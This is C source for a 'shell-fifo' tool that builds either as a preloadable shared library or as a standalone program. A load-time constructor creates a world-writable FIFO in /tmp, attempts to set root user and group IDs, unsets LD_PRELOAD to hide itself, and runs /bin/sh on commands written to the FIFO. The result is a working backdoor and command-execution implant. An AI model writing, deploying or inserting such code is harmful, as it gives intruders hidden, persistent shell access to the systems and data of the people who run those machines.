#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>

static void fifo_shell(const char* fifo_path) {
    fprintf(stderr, "[+] Starting FIFO shell with path: %s\n", fifo_path);
    
    unlink(fifo_path);
    
    if (mkfifo(fifo_path, 0666) < 0 && errno != EEXIST) {
        fprintf(stderr, "[-] Failed to create FIFO: %s\n", strerror(errno));
        return;
    }
    
    fprintf(stderr, "[+] FIFO created/exists at %s\n", fifo_path);
    fprintf(stderr, "[+] Waiting for commands (send with: echo 'command' > %s)\n", fifo_path);
    
    int fd = open(fifo_path, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[-] Failed to open FIFO: %s\n", strerror(errno));
        return;
    }
    
    fprintf(stderr, "[+] FIFO opened, spawning shell\n");
    
    dup2(fd, 0);
    close(fd);
    
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    
    unsetenv("LD_PRELOAD");
    
    execl("/bin/sh", "sh", NULL);
    fprintf(stderr, "[-] Failed to execute shell: %s\n", strerror(errno));
}

__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_FIFO_ACTIVE")) return;
    if (getenv("SHELL_FIFO_MAIN")) return;
    
    setenv("SHELL_FIFO_ACTIVE", "1", 1);
    const char* fifo_path = getenv("FIFO_PATH");
    if (!fifo_path) fifo_path = "/tmp/cmd.fifo";
    fifo_shell(fifo_path);
}

#ifdef ENABLE_MAIN
int main(int argc, char *argv[]) {
    setenv("SHELL_FIFO_MAIN", "1", 1);
    setenv("SHELL_FIFO_ACTIVE", "1", 1);
    
    char *fifo_path = NULL;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("shell-fifo - FIFO command shell utility\n");
            printf("Usage: %s [options] [fifo_path]\n", argv[0]);
            printf("\nOptions:\n");
            printf("  -h, --help    Show this help message\n");
            printf("  -f <path>     FIFO path (default: /tmp/cmd.fifo)\n");
            printf("\nExamples:\n");
            printf("  %s                      # Use default /tmp/cmd.fifo\n", argv[0]);
            printf("  %s /tmp/myfifo          # Use custom FIFO path\n", argv[0]);
            printf("  %s -f /var/run/cmd      # Use -f option\n", argv[0]);
            printf("\nUsage after starting:\n");
            printf("  echo 'id' > /tmp/cmd.fifo       # Send single command\n");
            printf("  cat script.sh > /tmp/cmd.fifo   # Send script\n");
            printf("\nEnvironment:\n");
            printf("  FIFO_PATH=<path>  FIFO path (fallback if no args)\n");
            return 0;
        } else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
            fifo_path = argv[++i];
        } else if (argv[i][0] != '-') {
            fifo_path = argv[i];
        }
    }
    
    if (!fifo_path) {
        fifo_path = getenv("FIFO_PATH");
    }
    
    if (!fifo_path) {
        fifo_path = "/tmp/cmd.fifo";
    }
    
    fifo_shell(fifo_path);
    return 0;
}
#endif